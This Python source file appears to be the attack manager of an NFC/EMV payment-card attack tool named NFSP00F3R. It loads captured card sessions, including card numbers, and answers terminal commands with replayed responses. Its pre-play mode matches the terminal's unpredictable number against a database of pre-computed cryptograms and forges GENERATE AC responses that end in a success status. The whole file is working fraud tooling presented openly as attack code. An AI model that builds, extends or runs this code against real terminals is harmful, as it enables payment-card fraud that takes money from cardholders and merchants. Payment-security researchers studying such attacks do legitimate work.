#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NFSP00F3R V5.00 - Attack Manager
================================

File: attack_manager.py
Authors: Gregory King & Matthew Braunschweig
Date: August 16, 2025
Description: Centralized attack management for replay and pre-play attacks

Classes:
- AttackManager: Core attack coordination and APDU processing
- SessionData: Captured EMV session storage
- PreplayDatabase: Pre-computed cryptogram database
"""

import json
import sqlite3
import asyncio
import logging
import hashlib
import time
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
from PyQt5.QtCore import QObject, pyqtSignal
import binascii

class AttackMode(Enum):
    DISABLED = "disabled"
    REPLAY = "replay"
    PREPLAY = "preplay"
    RELAY = "relay"

@dataclass
class APDUExchange:
    """Single APDU command-response exchange."""
    timestamp: float
    command: str  # hex string
    response: str  # hex string
    sw1: int
    sw2: int
    context: Dict[str, Any]  # additional metadata

@dataclass
class SessionData:
    """Complete captured EMV session."""
    session_id: str
    capture_timestamp: float
    pan: Optional[str]
    atc_start: Optional[str]
    exchanges: List[APDUExchange]
    metadata: Dict[str, Any]

@dataclass
class PreplayEntry:
    """Pre-computed cryptogram entry."""
    un: str  # unpredictable number
    atc: str  # application transaction counter
    arqc: str  # authorization request cryptogram
    tc: Optional[str]  # transaction certificate
    aac: Optional[str]  # application authentication cryptogram
    amount: Optional[str]
    currency: Optional[str]
    timestamp: float

class AttackManager(QObject):
    """
    Central attack manager for replay, pre-play, and relay attacks.
    Processes APDUs and coordinates attack responses.
    """
    
    # signals for gui integration
    mode_changed = pyqtSignal(str)
    session_loaded = pyqtSignal(str, int)  # filename, exchange_count
    database_loaded = pyqtSignal(str, int)  # filename, entry_count
    apdu_processed = pyqtSignal(str, str, str)  # command, response, attack_type
    attack_triggered = pyqtSignal(str, dict)  # attack_type, details
    error_occurred = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger(__name__)
        
        # attack configuration
        self.mode = AttackMode.DISABLED
        self.session_data: Optional[SessionData] = None
        self.preplay_db: Dict[str, PreplayEntry] = {}
        self.db_connection: Optional[sqlite3.Connection] = None
        
        # runtime state
        self.current_exchange_index = 0
        self.session_active = False
        self.attack_stats = {
            'commands_processed': 0,
            'attacks_triggered': 0,
            'replay_hits': 0,
            'preplay_hits': 0
        }
        
        # apdu pattern recognition
        self.apdu_patterns = {
            'select_aid': b'\x00\xA4\x04\x00',
            'get_processing_options': b'\x80\xA8\x00\x00',
            'read_record': b'\x00\xB2',
            'generate_ac': b'\x80\xAE'
        }
        
        self.logger.info("attack manager initialized")
        
    def set_mode(self, mode: Union[str, AttackMode]) -> bool:
        """Set attack mode."""
        try:
            if isinstance(mode, str):
                mode = AttackMode(mode.lower())
                
            old_mode = self.mode
            self.mode = mode
            
            self.logger.info(f"attack mode changed: {old_mode.value} -> {mode.value}")
            self.mode_changed.emit(mode.value)
            
            # reset state on mode change
            if mode == AttackMode.DISABLED:
                self.session_active = False
                self.current_exchange_index = 0
                
            return True
            
        except Exception as e:
            self.logger.error(f"failed to set mode {mode}: {e}")
            self.error_occurred.emit(f"mode change failed: {e}")
            return False
            
    def load_session(self, filepath: str) -> bool:
        """Load captured EMV session for replay attacks."""
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
                
            # validate session structure
            required_fields = ['session_id', 'capture_timestamp', 'exchanges']
            if not all(field in data for field in required_fields):
                raise ValueError("invalid session file format")
                
            # convert to session data object
            exchanges = []
            for ex_data in data['exchanges']:
                exchange = APDUExchange(
                    timestamp=ex_data['timestamp'],
                    command=ex_data['command'],
                    response=ex_data['response'],
                    sw1=ex_data['sw1'],
                    sw2=ex_data['sw2'],
                    context=ex_data.get('context', {})
                )
                exchanges.append(exchange)
                
            self.session_data = SessionData(
                session_id=data['session_id'],
                capture_timestamp=data['capture_timestamp'],
                pan=data.get('pan'),
                atc_start=data.get('atc_start'),
                exchanges=exchanges,
                metadata=data.get('metadata', {})
            )
            
            self.current_exchange_index = 0
            self.session_active = False
            
            self.logger.info(f"loaded session: {len(exchanges)} exchanges from {filepath}")
            self.session_loaded.emit(filepath, len(exchanges))
            
            return True
            
        except Exception as e:
            self.logger.error(f"failed to load session {filepath}: {e}")
            self.error_occurred.emit(f"session load failed: {e}")
            return False
            
    def load_database(self, filepath: str) -> bool:
        """Load pre-computed cryptogram database."""
        try:
            if filepath.endswith('.json'):
                return self._load_json_database(filepath)
            elif filepath.endswith('.db') or filepath.endswith('.sqlite'):
                return self._load_sqlite_database(filepath)
            else:
                raise ValueError("unsupported database format")
                
        except Exception as e:
            self.logger.error(f"failed to load database {filepath}: {e}")
            self.error_occurred.emit(f"database load failed: {e}")
            return False
            
    def _load_json_database(self, filepath: str) -> bool:
        """Load JSON format pre-play database."""
        with open(filepath, 'r') as f:
            data = json.load(f)
            
        self.preplay_db.clear()
        
        for entry_data in data.get('entries', []):
            entry = PreplayEntry(
                un=entry_data['un'],
                atc=entry_data['atc'],
                arqc=entry_data['arqc'],
                tc=entry_data.get('tc'),
                aac=entry_data.get('aac'),
                amount=entry_data.get('amount'),
                currency=entry_data.get('currency'),
                timestamp=entry_data.get('timestamp', time.time())
            )
            
            # key by un for fast lookup
            self.preplay_db[entry.un] = entry
            
        self.logger.info(f"loaded json database: {len(self.preplay_db)} entries")
        self.database_loaded.emit(filepath, len(self.preplay_db))
        
        return True
        
    def _load_sqlite_database(self, filepath: str) -> bool:
        """Load SQLite format pre-play database."""
        if self.db_connection:
            self.db_connection.close()
            
        self.db_connection = sqlite3.connect(filepath)
        cursor = self.db_connection.cursor()
        
        # check table exists
        cursor.execute("""
            SELECT name FROM sqlite_master 
            WHERE type='table' AND name='preplay_entries'
        """)
        
        if not cursor.fetchone():
            raise ValueError("preplay_entries table not found")
            
        # load all entries
        cursor.execute("""
            SELECT un, atc, arqc, tc, aac, amount, currency, timestamp
            FROM preplay_entries
        """)
        
        self.preplay_db.clear()
        count = 0
        
        for row in cursor.fetchall():
            entry = PreplayEntry(
                un=row[0],
                atc=row[1],
                arqc=row[2],
                tc=row[3],
                aac=row[4],
                amount=row[5],
                currency=row[6],
                timestamp=row[7] or time.time()
            )
            
            self.preplay_db[entry.un] = entry
            count += 1
            
        self.logger.info(f"loaded sqlite database: {count} entries")
        self.database_loaded.emit(filepath, count)
        
        return True
        
    def process_apdu(self, apdu_bytes: bytes) -> Optional[bytes]:
        """
        Process incoming APDU and return attack response if applicable.
        This is the main entry point for all relay modules.
        """
        try:
            self.attack_stats['commands_processed'] += 1
            
            apdu_hex = apdu_bytes.hex().upper()
            self.logger.debug(f"processing apdu: {apdu_hex}")
            
            # identify apdu type
            apdu_type = self._identify_apdu_type(apdu_bytes)
            
            # route to appropriate attack handler
            response = None
            attack_triggered = False
            
            if self.mode == AttackMode.REPLAY:
                response = self._handle_replay_attack(apdu_bytes, apdu_type)
                if response:
                    attack_triggered = True
                    self.attack_stats['replay_hits'] += 1
                    
            elif self.mode == AttackMode.PREPLAY:
                response = self._handle_preplay_attack(apdu_bytes, apdu_type)
                if response:
                    attack_triggered = True
                    self.attack_stats['preplay_hits'] += 1
                    
            # emit signals for gui
            if response:
                response_hex = response.hex().upper()
                self.apdu_processed.emit(apdu_hex, response_hex, self.mode.value)
                
                if attack_triggered:
                    self.attack_stats['attacks_triggered'] += 1
                    self.attack_triggered.emit(self.mode.value, {
                        'apdu_type': apdu_type,
                        'command': apdu_hex,
                        'response': response_hex
                    })
                    
            return response
            
        except Exception as e:
            self.logger.error(f"apdu processing failed: {e}")
            self.error_occurred.emit(f"apdu processing error: {e}")
            return None
            
    def _identify_apdu_type(self, apdu_bytes: bytes) -> str:
        """Identify APDU command type for attack targeting."""
        if len(apdu_bytes) < 4:
            return "unknown"
            
        cla, ins, p1, p2 = apdu_bytes[:4]
        
        # check against known patterns
        for pattern_name, pattern_bytes in self.apdu_patterns.items():
            if apdu_bytes.startswith(pattern_bytes):
                return pattern_name
                
        # additional pattern matching
        if cla == 0x00 and ins == 0xA4:
            return "select"
        elif cla == 0x80 and ins == 0xA8:
            return "get_processing_options"
        elif cla == 0x00 and ins == 0xB2:
            return "read_record"
        elif cla == 0x80 and ins == 0xAE:
            return "generate_ac"
        elif cla == 0x00 and ins == 0x20:
            return "verify_pin"
        else:
            return f"unknown_{cla:02x}_{ins:02x}"
            
    def _handle_replay_attack(self, apdu_bytes: bytes, apdu_type: str) -> Optional[bytes]:
        """Handle replay attack logic."""
        if not self.session_data or not self.session_data.exchanges:
            return None
            
        apdu_hex = apdu_bytes.hex().upper()
        
        # find matching exchange in session
        for i, exchange in enumerate(self.session_data.exchanges):
            if exchange.command == apdu_hex:
                self.logger.info(f"replay match found: exchange {i}")
                
                # construct response
                response_bytes = bytes.fromhex(exchange.response)
                sw_bytes = bytes([exchange.sw1, exchange.sw2])
                
                return response_bytes + sw_bytes
                
        # sequential replay mode - follow session order
        if self.session_active and self.current_exchange_index < len(self.session_data.exchanges):
            current_exchange = self.session_data.exchanges[self.current_exchange_index]
            
            # check if command matches expected sequence
            if current_exchange.command == apdu_hex:
                self.logger.info(f"sequential replay: exchange {self.current_exchange_index}")
                
                response_bytes = bytes.fromhex(current_exchange.response)
                sw_bytes = bytes([current_exchange.sw1, current_exchange.sw2])
                
                self.current_exchange_index += 1
                
                return response_bytes + sw_bytes
                
        return None
        
    def _handle_preplay_attack(self, apdu_bytes: bytes, apdu_type: str) -> Optional[bytes]:
        """Handle pre-play attack logic."""
        if apdu_type != "generate_ac" or not self.preplay_db:
            return None
            
        # extract unpredictable number from generate ac command
        un = self._extract_unpredictable_number(apdu_bytes)
        if not un:
            return None
            
        # lookup pre-computed response
        if un in self.preplay_db:
            entry = self.preplay_db[un]
            self.logger.info(f"preplay match found for un: {un}")
            
            # construct generate ac response
            response = self._build_generate_ac_response(entry)
            return response
            
        return None
        
    def _extract_unpredictable_number(self, apdu_bytes: bytes) -> Optional[str]:
        """Extract unpredictable number from GENERATE AC command."""
        try:
            if len(apdu_bytes) < 5:
                return None
                
            # generate ac format: 80 AE xx xx lc data
            lc = apdu_bytes[4]
            if len(apdu_bytes) < 5 + lc:
                return None
                
            data = apdu_bytes[5:5+lc]
            
            # un is typically last 4 bytes of cdol data
            if len(data) >= 4:
                un = data[-4:].hex().upper()
                return un
                
            return None
            
        except Exception as e:
            self.logger.error(f"failed to extract un: {e}")
            return None
            
    def _build_generate_ac_response(self, entry: PreplayEntry) -> bytes:
        """Build GENERATE AC response from pre-play entry."""
        try:
            # construct response data
            response_data = bytearray()
            
            # add cryptogram format indicator
            response_data.append(0x80)  # arqc format
            
            # add atc
            atc_bytes = bytes.fromhex(entry.atc)
            response_data.extend(atc_bytes)
            
            # add arqc
            arqc_bytes = bytes.fromhex(entry.arqc)
            response_data.extend(arqc_bytes)
            
            # add issuer application data if available
            if entry.tc:
                tc_bytes = bytes.fromhex(entry.tc)
                response_data.extend(tc_bytes)
                
            # add success status words
            response_data.extend([0x90, 0x00])
            
            return bytes(response_data)
            
        except Exception as e:
            self.logger.error(f"failed to build response: {e}")
            return b'\x6F\x00'  # unknown error
            
    def start_session(self) -> bool:
        """Start active attack session."""
        if self.mode == AttackMode.DISABLED:
            return False
            
        if self.mode == AttackMode.REPLAY and not self.session_data:
            self.error_occurred.emit("no session loaded for replay")
            return False
            
        if self.mode == AttackMode.PREPLAY and not self.preplay_db:
            self.error_occurred.emit("no database loaded for preplay")
            return False
            
        self.session_active = True
        self.current_exchange_index = 0
        
        self.logger.info(f"attack session started: {self.mode.value}")
        return True
        
    def stop_session(self) -> bool:
        """Stop active attack session."""
        self.session_active = False
        self.current_exchange_index = 0
        
        self.logger.info(f"attack session stopped: {self.mode.value}")
        return True
        
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics."""
        return {
            'mode': self.mode.value,
            'session_active': self.session_active,
            'current_exchange': self.current_exchange_index,
            'total_exchanges': len(self.session_data.exchanges) if self.session_data else 0,
            'preplay_entries': len(self.preplay_db),
            **self.attack_stats
        }
        
    def create_session_from_exchanges(self, exchanges: List[APDUExchange], 
                                    session_id: str = None, 
                                    pan: str = None) -> str:
        """Create session data from exchange list."""
        if not session_id:
            session_id = f"session_{int(time.time())}"
            
        self.session_data = SessionData(
            session_id=session_id,
            capture_timestamp=time.time(),
            pan=pan,
            atc_start=None,
            exchanges=exchanges,
            metadata={}
        )
        
        return session_id
        
    def save_session(self, filepath: str) -> bool:
        """Save current session to file."""
        if not self.session_data:
            return False
            
        try:
            with open(filepath, 'w') as f:
                json.dump(asdict(self.session_data), f, indent=2)
                
            self.logger.info(f"session saved to {filepath}")
            return True
            
        except Exception as e:
            self.logger.error(f"failed to save session: {e}")
            return False
            
    def add_preplay_entry(self, un: str, atc: str, arqc: str, 
                         tc: str = None, aac: str = None,
                         amount: str = None, currency: str = None) -> bool:
        """Add entry to pre-play database."""
        try:
            entry = PreplayEntry(
                un=un,
                atc=atc,
                arqc=arqc,
                tc=tc,
                aac=aac,
                amount=amount,
                currency=currency,
                timestamp=time.time()
            )
            
            self.preplay_db[un] = entry
            
            # also save to sqlite if connected
            if self.db_connection:
                cursor = self.db_connection.cursor()
                cursor.execute("""
                    INSERT OR REPLACE INTO preplay_entries
                    (un, atc, arqc, tc, aac, amount, currency, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (entry.un, entry.atc, entry.arqc, entry.tc, 
                     entry.aac, entry.amount, entry.currency, entry.timestamp))
                self.db_connection.commit()
                
            self.logger.info(f"added preplay entry for un: {un}")
            return True
            
        except Exception as e:
            self.logger.error(f"failed to add preplay entry: {e}")
            return False
